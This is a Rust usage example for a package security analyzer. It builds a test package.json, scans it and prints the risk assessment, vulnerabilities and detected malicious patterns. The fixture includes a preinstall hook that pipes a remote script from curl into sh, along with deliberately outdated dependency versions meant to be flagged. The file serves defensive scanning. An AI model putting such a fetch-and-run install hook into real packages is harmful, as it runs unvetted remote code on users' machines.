//! Basic usage example for ThreatFlux Package Security

use threatflux_package_security::PackageSecurityAnalyzer;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Create a test package.json
    let test_dir = tempfile::tempdir()?;
    let package_json_path = test_dir.path().join("package.json");

    std::fs::write(
        &package_json_path,
        r#"{
        "name": "test-package",
        "version": "1.0.0",
        "description": "Test package for security analysis",
        "scripts": {
            "preinstall": "curl https://example.com/script.sh | sh",
            "postinstall": "node install.js"
        },
        "dependencies": {
            "lodash": "4.17.10",
            "minimist": "1.2.0"
        },
        "devDependencies": {
            "jest": "^27.0.0"
        }
    }"#,
    )?;

    // Create analyzer
    let analyzer = PackageSecurityAnalyzer::new()?;

    // Analyze the package
    println!("Analyzing package at: {}", test_dir.path().display());
    let result = analyzer.analyze(test_dir.path()).await?;

    // Print results
    let risk_assessment = result.risk_assessment();
    println!("\n=== Risk Assessment ===");
    println!("Risk Level: {:?}", risk_assessment.risk_score.risk_level);
    println!(
        "Total Score: {:.1}/100",
        risk_assessment.risk_score.total_score
    );
    println!("Summary: {}", risk_assessment.summary);

    // Print vulnerabilities
    let vulnerabilities = result.vulnerabilities();
    if !vulnerabilities.is_empty() {
        println!("\n=== Vulnerabilities Found ===");
        for vuln in vulnerabilities {
            println!("- {} ({}): {}", vuln.id, vuln.severity, vuln.title);
            println!("  Affected versions: {:?}", vuln.affected_versions);
            println!("  Fixed in: {:?}", vuln.fixed_versions);
        }
    }

    // Print malicious patterns
    let patterns = result.malicious_patterns();
    if !patterns.is_empty() {
        println!("\n=== Malicious Patterns Detected ===");
        for pattern in patterns {
            println!("- {}: {}", pattern.pattern_name, pattern.description);
            println!("  Category: {:?}", pattern.category);
            println!("  Evidence: {:?}", pattern.evidence);
        }
    }

    // Print dependency analysis
    let deps = result.dependency_analysis();
    println!("\n=== Dependency Analysis ===");
    println!("Total dependencies: {}", deps.total_dependencies);
    println!("Direct dependencies: {}", deps.direct_dependencies);
    println!("Vulnerabilities in dependencies:");
    println!("  Critical: {}", deps.vulnerability_summary.critical_count);
    println!("  High: {}", deps.vulnerability_summary.high_count);
    println!("  Medium: {}", deps.vulnerability_summary.medium_count);
    println!("  Low: {}", deps.vulnerability_summary.low_count);

    Ok(())
}
